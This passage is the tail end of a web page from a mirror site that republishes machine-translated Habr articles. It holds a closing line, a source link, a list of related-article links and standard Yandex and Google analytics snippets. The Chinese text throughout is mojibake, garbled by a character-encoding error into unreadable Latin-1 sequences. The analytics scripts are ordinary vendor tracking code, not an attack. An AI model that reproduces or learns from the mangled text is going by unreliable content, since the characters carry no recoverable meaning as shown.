‡è¯­ä¸ºæ­¢å·²ç»è¿‡å»äº†40ä¸ªå°æ—¶ã€‚</font></font>è°¢è°¢å•¦ </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN440312/">https://habr.com/ru/post/zh-CN440312/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN440302/index.html">CRM-æˆåŠŸæˆæœ¬ï¼Œé”™è¯¯æˆæœ¬ï¼Œæ‹¥æœ‰æˆæœ¬</a></li>
<li><a href="../zh-CN440304/index.html">æ¥è‡ªx86ç³»ç»Ÿä¸­çš„å¤–éƒ¨è®¾å¤‡çš„ä¸­æ–­ã€‚ ç¬¬3éƒ¨åˆ†ã€‚ä½¿ç”¨corebootç¤ºä¾‹åœ¨èŠ¯ç‰‡ç»„ä¸­é…ç½®ä¸­æ–­è·¯ç”±</a></li>
<li><a href="../zh-CN440306/index.html">é«˜è´Ÿè½½ç³»ç»Ÿä¸­çš„æ•°æ®åº“æ‰©å±•</a></li>
<li><a href="../zh-CN440308/index.html">åˆ†è€Œæ²»ä¹‹ï¼Œæˆ–æ…¢æ…¢å†™-å¿«é€Ÿé˜…è¯»</a></li>
<li><a href="../zh-CN440310/index.html">å¦‚ä½•æ•™æœºå™¨ç†è§£å‘ç¥¨å¹¶ä»ä¸­æå–æ•°æ®</a></li>
<li><a href="../zh-CN440314/index.html">JDK 12å‘è¡Œå€™é€‰ï¼šShenandoahï¼ŒG1ï¼ŒJMHï¼ŒArm64ã€‚ Swingä¸­çš„é”™è¯¯ä¼šåå‡»</a></li>
<li><a href="../zh-CN440316/index.html">ä¸‰è§’å½¢ä¸­ç‚¹çš„å‡åŒ€åˆ†å¸ƒ</a></li>
<li><a href="../zh-CN440318/index.html">GDPRï¼šå¦‚ä½•å¤„ç†æ‚¨çš„å‘˜å·¥ï¼Œè‡ªç”±èŒä¸šè€…å’Œæ¬§æ´²äº¤æ˜“å¯¹æ‰‹å‘˜å·¥çš„ä¸ªäººæ•°æ®</a></li>
<li><a href="../zh-CN440320/index.html">å½“æˆ‘ä»¬åœ¨DMRSE Yandexè®¡æ•°å™¨ä¸­è®¡æ—¶æ—¶</a></li>
<li><a href="../zh-CN440322/index.html">ä¸ºä»€ä¹ˆHDDå‡ºç°æ•…éšœçš„å¯èƒ½æ€§é™ä½</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>